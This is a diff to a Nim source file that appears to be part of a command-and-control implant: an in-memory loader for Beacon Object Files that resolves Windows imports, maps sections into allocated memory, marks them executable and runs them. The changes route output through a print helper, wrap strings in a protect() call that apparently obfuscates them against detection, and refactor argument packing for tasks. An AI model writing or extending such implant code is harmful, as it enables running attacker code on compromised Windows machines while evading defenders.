@@ -1,6 +1,6 @@
 import winim/lean
 import os, strformat, strutils, ptr_math
-import ./beacon
+import ../utils/[beacon, io]
 import ../../common/[types, utils, serialize]
 
 #[
@@ -88,7 +88,7 @@ proc objectVirtualSize(objCtx: POBJECT_CTX): ULONG =
             # Check if symbol starts with `__ipm_` (imported functions)
             if ($symbol).startsWith("__imp_"): 
                 length += ULONG(sizeof(PVOID))
-            # echo $symbol
+            # print $symbol
 
             # Handle next relocation item/symbol
             objRel = cast[PIMAGE_RELOCATION](cast[int](objRel) + sizeof(IMAGE_RELOCATION))
@@ -149,14 +149,14 @@ proc objectResolveSymbol(symbol: var PSTR): PVOID =
         if hModule == 0:
             hModule = LoadLibraryA(library)
             if hModule == 0: 
-                raise newException(CatchableError, fmt"Library {$library} not found.")
+                raise newException(CatchableError, GetLastError().getError())
 
         # Resolve the function from the loaded library 
         resolved = GetProcAddress(hModule, function)
         if resolved == NULL: 
-            raise newException(CatchableError, fmt"Function {$function} not found in {$library}.")
+            raise newException(CatchableError, GetLastError().getError())
 
-    echo fmt"    [>] {$symbol} @ 0x{resolved.repr}"
+    print fmt"    [>] {$symbol} @ 0x{resolved.repr}"
 
     RtlSecureZeroMemory(addr buffer[0], sizeof(buffer))
 
@@ -295,7 +295,7 @@ proc objectExecute(objCtx: POBJECT_CTX, entry: PSTR, args: seq[byte]): bool =
 
             # Change the memory protection from [RW-] to [R-X]
             if VirtualProtect(secBase, secSize, PAGE_EXECUTE_READ, addr oldProtect) == 0: 
-                raise newException(CatchableError, $GetLastError())
+                raise newException(CatchableError, GetLastError().getError())
 
             # Execute BOF entry point 
             var entryPoint = cast[EntryPoint](cast[uint](secBase) + cast[uint](objSym.Value))
@@ -307,7 +307,7 @@ proc objectExecute(objCtx: POBJECT_CTX, entry: PSTR, args: seq[byte]): bool =
 
             # Revert the memory protection change
             if VirtualProtect(secBase, secSize, oldProtect, addr oldProtect) == 0: 
-                raise newException(CatchableError, $GetLastError())
+                raise newException(CatchableError, GetLastError().getError())
 
             return true
 
@@ -332,45 +332,45 @@ proc inlineExecute*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction:
 
     var pObject = addr objectFile[0]
     if pObject == NULL or entryFunction == NULL: 
-        raise newException(CatchableError, "Arguments pObject and entryFunction are required.")
+        raise newException(CatchableError, protect("Missing required arguments."))
 
     # Parsing the object file's file header, symbol table and sections
     objCtx.union.header = cast[PIMAGE_FILE_HEADER](pObject)
     objCtx.symTbl       = cast[PIMAGE_SYMBOL](cast[int](pObject) + cast[int](objCtx.union.header.PointerToSymbolTable))
     objCtx.sections     = cast[PIMAGE_SECTION_HEADER](cast[int](pObject) + sizeof(IMAGE_FILE_HEADER))
 
-    # echo objCtx.union.header.repr
-    # echo objCtx.symTbl.repr
-    # echo objCtx.sections.repr
+    # print objCtx.union.header.repr
+    # print objCtx.symTbl.repr
+    # print objCtx.sections.repr
 
     # Verifying that the object file's architecture is x64
     when defined(amd64): 
         if objCtx.union.header.Machine != IMAGE_FILE_MACHINE_AMD64: 
             RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-            raise newException(CatchableError, "Only x64 object files are supported")
+            raise newException(CatchableError, protect("Only x64 object files are supported."))
     else: 
         RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-        raise newException(CatchableError, "Only x64 object files are supported")
+        raise newException(CatchableError, protect("Only x64 object files are supported."))
 
     # Calculate required virtual memory
     virtSize = objectVirtualSize(addr objCtx)
-    echo fmt"[*] Virtual size of object file: {virtSize} bytes"
+    print fmt"[*] Virtual size of object file: {virtSize} bytes"
 
     # Allocate memory 
     virtAddr = VirtualAlloc(NULL, virtSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
     if virtAddr == NULL: 
         RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: VirtualFree(virtAddr, 0, MEM_RELEASE)
 
     # Allocate heap memory to store section map array
     objCtx.secMap = cast[PSECTION_MAP](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, int(objCtx.union.header.NumberOfSections) * sizeof(SECTION_MAP)))
     if objCtx.secMap == NULL: 
         RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, objCtx.secMap)
 
-    echo fmt"[*] Virtual memory allocated for object file at 0x{virtAddr.repr} ({virtSize} bytes)"
+    print fmt"[*] Virtual memory allocated for object file at 0x{virtAddr.repr} ({virtSize} bytes)"
     
     # Set the section base to the allocated memory
     secBase = virtAddr
@@ -380,7 +380,7 @@ proc inlineExecute*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction:
         sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](objCtx.sections)
         secMap = cast[ptr UncheckedArray[SECTION_MAP]](objCtx.secMap)
 
-    echo "[*] Copying over sections."
+    print "[*] Copying over sections."
     for i in 0 ..< int(objCtx.union.header.NumberOfSections): 
         secSize = sections[i].SizeOfRawData
         secMap[i].size = secSize
@@ -388,7 +388,7 @@ proc inlineExecute*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction:
 
         # Copy over section data
         copyMem(secBase, cast[PVOID](objCtx.union.base + cast[int](sections[i].PointerToRawData)), secSize)
-        echo fmt"    [>] {$(addr sections[i].Name)} @ 0x{secBase.repr} ({secSize} bytes))"
+        print fmt"    [>] {$(addr sections[i].Name)} @ 0x{secBase.repr} ({secSize} bytes))"
 
         # Get the next page entry
         secBase = cast[PVOID](PAGE_ALIGN(cast[uint](secBase) + uint(secSize)))
@@ -396,17 +396,17 @@ proc inlineExecute*(objectFile: seq[byte], args: seq[byte] = @[], entryFunction:
     # The last page of the memory is the symbol/function map
     objCtx.symMap = cast[ptr PVOID](secBase)
 
-    echo "[*] Processing sections and performing relocations."
+    print "[*] Processing sections and performing relocations."
     if not objectProcessSection(addr objCtx): 
         RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
-        raise newException(CatchableError, "Failed to process sections.")
+        raise newException(CatchableError, protect("Failed to process sections."))
 
     # Executing the object file 
-    echo "[*] Executing."
+    print "[*] Executing."
     if not objectExecute(addr objCtx, entryFunction, args): 
         RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
         raise newException(CatchableError, fmt"Failed to execute function {$entryFunction}.")
-    echo "[+] Object file executed successfully."
+    print "[+] Object file executed successfully."
     
     RtlSecureZeroMemory(addr objCtx, sizeof(objCtx))
 
@@ -449,7 +449,7 @@ proc generateCoffArguments*(args: seq[TaskArg]): seq[byte] =
                     prefix = Bytes.toString(arg.data)[0..3]
                     value = Bytes.toString(arg.data)[4..^1]
 
-                # Check the first two characters for a type specification 
+                # Check the prefix for a type specification 
                 case prefix: 
                 of protect("[i]:"): 
                     # Handle argument as integer
@@ -465,8 +465,7 @@ proc generateCoffArguments*(args: seq[TaskArg]): seq[byte] =
                     # Handle argument as wide string  
                     # Add terminating NULL byte to the end of string arguments
                     let wStrData = cast[seq[byte]](+$value) # +$ converts a string to a wstring
-                    packer.add(uint32(wStrData.len()))
-                    packer.addData(wStrData)
+                    packer.addDataWithLengthPrefix(wStrData)
 
                 else: 
                     # In case no prefix is specified, handle the argument as a regular string
@@ -476,8 +475,7 @@ proc generateCoffArguments*(args: seq[TaskArg]): seq[byte] =
                 # Handle argument as regular string
                 # Add terminating NULL byte to the end of string arguments
                 let data = arg.data & @[uint8(0)]
-                packer.add(uint32(data.len()))
-                packer.addData(data)
+                packer.addDataWithLengthPrefix(data)
     
         else: 
             # Argument is not passed as a string, but instead directly as a int or short 
